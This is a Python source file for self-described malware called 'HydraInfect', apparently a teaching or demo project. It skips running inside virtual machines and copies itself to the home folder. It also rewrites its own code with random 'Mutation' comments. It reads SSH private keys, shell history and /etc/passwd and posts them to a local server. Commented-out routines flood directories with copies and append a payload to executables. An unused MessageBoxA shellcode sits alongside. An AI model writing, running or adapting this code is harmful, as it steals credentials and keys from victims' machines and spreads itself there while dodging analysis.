import os
import platform
# Mutation 64412
import ctypes
# Mutation 86313
import shutil
import random
import requests
import time
# import winreg


# Constants for code injection (Windows only)
PROCESS_ALL_ACCESS = 0x1F0FFF
VIRTUAL_MEM = (0x1000 | 0x2000)
PAGE_EXECUTE_READWRITE = 0x40

# Shellcode for MessageBoxA (Windows API) in x86 architecture
shellcode = (
    b"\x31\xC9"                  # xor ecx, ecx
    b"\x51"                      # push ecx
    b"\x68\x65\x6C\x6C\x21"      # push 0x216c6c65 ('ell!')
    b"\x68\x4D\x73\x67\x42"      # push 0x4273674d ('MsgB')
    b"\x8B\xC4"                  # mov eax, esp
    b"\x6A\x00"                  # push 0x0 (MB_OK)
    b"\x50"                      # push eax
    b"\xBB\xF0\x04\xE4\x77"      # mov ebx, 0x77E404F0 (address of MessageBoxA)
    b"\xFF\xD3"                  # call ebx
    b"\x31\xC0"                  # xor eax, eax
    b"\x50"                      # push eax
    b"\xC3"                      # ret
)

# 1. Environment Detection (Basic Evasion)

def is_virtual_environment():
    if platform.system() == "Linux":
        # Check for specific virtualization files
        if os.path.exists('/proc/scsi/scsi'):
            with open('/proc/scsi/scsi') as f:
                if 'VMware' in f.read() or 'VirtualBox' in f.read() or 'QEMU' in f.read():
                    return True        
        # Check for DMI entries (BIOS/Hardware info)
        if os.path.exists('/sys/class/dmi/id/product_name'):
            with open('/sys/class/dmi/id/product_name') as f:
                product_name = f.read().strip()
                if 'VirtualBox' in product_name or 'VMware' in product_name or 'QEMU' in product_name:
                    return True
        
        if os.path.exists('/sys/class/dmi/id/sys_vendor'):
            with open('/sys/class/dmi/id/sys_vendor') as f:
                sys_vendor = f.read().strip()
                if 'VirtualBox' in sys_vendor or 'VMware' in sys_vendor or 'QEMU' in sys_vendor:
                    return True
        
        # Check for CPU flags related to virtualization
        try:
            with open('/proc/cpuinfo') as f:
                cpuinfo = f.read()
                if 'hypervisor' in cpuinfo:
                    return True
        except FileNotFoundError:
            pass
        
# Mutation 36225
        # Alternative check using `lshw` if available
        try:
            output = os.popen('lshw -short').read()
            if 'VirtualBox' in output or 'VMware' in output or 'QEMU' in output:
                return True
        except Exception:
            pass

        return False
    
    

    return False
    

# 2. Display Message
def display_message():
    os_type = platform.system()
    if os_type == "Windows":
        ctypes.windll.user32.MessageBoxW(0, "You've been infected by HydraInfect!", "Malware Alert", 1)
    elif os_type == "Darwin":  # macOS
        os.system('osascript -e \'tell app "System Events" to display dialog "You\'ve been infected by HydraInfect!"\'')
    elif os_type == "Linux":
        os.system('zenity --info --text="You\'ve been infected by HydraInfect!"')
    else:
        print("You've been infected by HydraInfect!")  # Fallback for other OSes

# 3. Virus-like Behavior (Self-Replication)

def replicate():
    current_file = __file__
    print(f"Current file path: {current_file}")
    
    target_locations = []

    if platform.system() == "Windows":
        target_path = os.path.join(os.environ["HOMEPATH"], "malware_copy.exe")
        print(f"Target path for Windows: {target_path}")
        target_locations.append(target_path)
    elif platform.system() == "Linux" or platform.system() == "Darwin":
        target_path = os.path.expanduser("~/malware_copy")
        print(f"Target path for Linux/macOS: {target_path}")
        target_locations.append(target_path)

    for target in target_locations:
        print(f"Copying to: {target}")
        shutil.copyfile(current_file, target)

#Infinite replicating to overload system
# def infinite_replicate():
#     current_file = __file__
#     target_dir = os.path.expanduser("~")  # Start in the user's home directory

#     while True:
#         for i in range(10):  # Limit the number of copies per loop to prevent rapid system overload
#             target_location = os.path.join(target_dir, f"malware_copy_{random.randint(1000, 9999)}.py")
#             shutil.copyfile(current_file, target_location)
#             print(f"Copied to {target_location}")

#         # Recursively replicate to other directories
#         for root, dirs, files in os.walk(target_dir):
#             for name in dirs:
#                 new_target_dir = os.path.join(root, name)
#                 target_location = os.path.join(new_target_dir, f"malware_copy_{random.randint(1000, 9999)}.py")
#                 shutil.copyfile(current_file, target_location)
#                 print(f"Copied to {target_location}")

#         # Wait a bit before replicating again to avoid immediate detection
#         time.sleep(5)



#Spreading and injecting payload for linux:

# def is_executable(file_path):
#     """Check if the file is executable."""
#     return os.path.isfile(file_path) and os.access(file_path, os.X_OK)

# def inject_payload(file_path):
#     """Inject payload into the file."""
#     with open(file_path, 'ab') as f:
#         f.write(payload)
#     print(f"Injected payload into {file_path}")

# def search_and_inject(base_path):
#     """Search for executable files and inject payload."""
#     for root, dirs, files in os.walk(base_path):
#         for file in files:
#             file_path = os.path.join(root, file)
#             if is_executable(file_path):
#                 inject_payload(file_path)
                


# 4. Mutation
def mutate():
    with open(__file__, 'r') as f:
        lines = f.readlines()

    mutation_line = random.randint(0, len(lines) - 1)
    lines.insert(mutation_line, f"# Mutation {random.randint(1, 100000)}\n")

    with open(__file__, 'w') as f:
# Mutation 57834
        f.writelines(lines)

# 5. Data Exfiltration

#Collecting sensitive data for Linux

def get_sensitive_data():
    # Define the paths to check for sensitive data
    paths = [
        os.path.expanduser('~/.bash_history'),
        os.path.expanduser('~/.ssh/id_rsa'),
        os.path.expanduser('~/Desktop'),
        os.path.expanduser('~/Documents'),
        '/etc/passwd',  # Example for Unix-like systems
    ]
    
    sensitive_data = ''
    for path in paths:
        if os.path.exists(path):
            try:
                with open(path, 'r') as file:
                    sensitive_data += f'\nContents of {path}:\n'
                    sensitive_data += file.read()
            except Exception as e:
                sensitive_data += f'\nFailed to read {path}: {e}\n'
    
    return sensitive_data

def send_data_to_server(data, server_url):
    try:
        response = requests.post(server_url, data={'data': data})
        if response.status_code == 200:
            print("Data sent successfully")
        else:
            print(f"Failed to send data, status code: {response.status_code}")
            print(response.text)
    except Exception as e:
        print(f"Error sending data: {e}")



# Main function to run the malware
def main():
    print(is_virtual_environment())
    if is_virtual_environment():
        return

    replicate()
    # infinite_replicate()
    mutate()
    # Specify the base directory to start searching
    base_directory = '/'
    # search_and_inject(base_directory)
    
    # Collect sensitive data
    sensitive_data = get_sensitive_data()

    # Send sensitive data to the server
    send_data_to_server(sensitive_data, 'http://localhost:8000/receive')

    display_message()


if __name__ == "__main__":
    main()